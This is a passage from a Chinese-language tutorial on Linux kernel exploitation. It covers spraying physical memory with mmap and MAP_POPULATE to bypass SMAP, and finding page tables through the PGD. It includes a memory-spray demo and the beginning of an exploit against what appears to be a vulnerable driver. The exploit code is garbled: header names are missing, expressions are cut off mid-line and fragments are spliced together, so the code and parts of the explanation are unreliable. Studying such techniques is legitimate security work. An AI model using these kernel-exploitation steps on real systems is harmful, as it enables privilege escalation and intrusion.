spray的方式将用户空间的代码映射到内核里面，只需要用 **MAP_POPULATE** 的flag:
           MAP_POPULATE (since Linux 2.5.46)
                  Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.
这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main (int argc, char **argv){
        int cnt = 0;
        void *pg;
        while(1) {
            pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
            if (pg == MAP_FAILED) {
                perror("mmap");
                break;
            }
            else {
                cnt++;
                if (cnt % 1000 == 0) {
                    printf("[*] allocated %d pages, asking for more...\n", cnt);
                }
            }
        }
        printf("[*] number of pages allocated: %d\n", cnt);
        return 0;
    }
通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，
**那就是它们一般都是连续分配的**
。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。
那么应该如何获得物理地址呢？通过[文档](https://www.kernel.org/doc/gorman/html/understand/understand006.html)发现，在Linux中每一个进程都维护一个指针`mm_struct->pgd`指向该进程的
**Page Global Directory (PGD)**
，表里面包含的是`pgd_t`数组，pgd_t定义在`asm/page.h`里面根据不同的架构拥有不同的值，在x86架构下`mm_struct->pgd`会被复制到cr3寄存器。
可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过`/proc/(pid)/pagemap`获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：
  1. 最高位为1。
  2. 最低字节为0x67。
那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define VULN_READ 0x1111
    #define VULN_WRITE 0x2222
    #define VULN_STACK 0x3333
    #define VULN_PGD 0x4444
    #define VULN_PB 0x5555
    #define SPRAY_CNT 0x10000
    struct rwRequest {
        void *kaddr;
        void *uaddr;
        size_t length;
    };
    unsigned long pageOffsetBase = 0xffff888000000000;
    int Open(char *fname, int mode) {
        int fd;
        if ((fd = open(fname, mode)) > 63))) {
                return 0;
            }
        }
        return page[0x100] == 0;
    }
    int main (int argc, char **argv){
        void *pg;
        unsigned long search_addr;
        search_addr = pageOffsetBase + (0x7c000  
> 
* * *